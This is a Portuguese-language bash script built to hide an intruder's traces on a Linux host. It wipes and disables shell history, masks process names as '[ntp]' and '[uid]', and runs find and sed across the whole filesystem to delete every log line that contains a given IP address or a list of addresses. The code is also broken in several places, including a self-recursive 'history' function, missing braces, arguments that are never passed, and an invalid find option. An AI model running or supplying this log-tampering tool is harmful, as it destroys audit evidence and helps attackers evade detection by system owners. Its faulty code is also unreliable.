#!/bin/bash


ARGS=$1


help(){

   echo "Modo de uso:"
   echo "./$0 -ip SEU-IP"
   echo ""
   echo "Modo Arquivo: ./$0 -f ips.txt"
}



history(){


 echo "Apagando o historico existente da sessão"
 echo ""
 history -c

 echo ""
 echo "Pausando todos os  historicos!"
 echo ""
 unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null




ip(){

if [[ -n "$2" && "$2" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
   echo ""
   echo "Removendo todas as Linhas de arquivos com o seu IP !"
   echo ""
   find / -name "*\.*\.log\." -type f -not -path "$(pwd)/*"   -exec sed -i "/$2/d" {} \;
   find / -name "*\.log\.*\.*" -type f -not -path "$(pwd)/*"   -exec sed -i "/$2/d" {} \;
   find / -name "*\.log\.*" -type f  -not -path "$(pwd)/*" -exec sed -i "/$2/d" {} \;
   
else
   echo "Digite um valor valido!"
fi

}

fileip(){

 if [[ -e "$2" && ! -s "$2" ]]; then
    echo ""
    if grep -Evq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' "$2"; then
    echo "O arquivo '$file' contém valores que não são IPs."
    exit 0;
    else
      for i in $(cat $2); do
         find / -no-name "*\.*\.log\." -type f  -not -path "$(pwd)/*" -exec sed -i "/$i/d" {} \;
         find / -name "*\.log\.*\.*" -type f -not -path "$(pwd)/*"  -exec sed -i "/$i/d" {} \;
         find / -name "*\.log\.*" -type f -not -path "$(pwd)/*"  -exec sed -i "/$i/d" {} \;


         echo ""
         echo "Efetuado com sucesso meu nobre!"
      done

    fi

  fi


case $ARGS in 


"-ip"|"--ip")
    history
    ip
    ;;

 "-f"|"--file")
    history
    fileip
    ;;
  *)
  echo "Opção não encontrada!"
  exit 0;
  ;;


esac

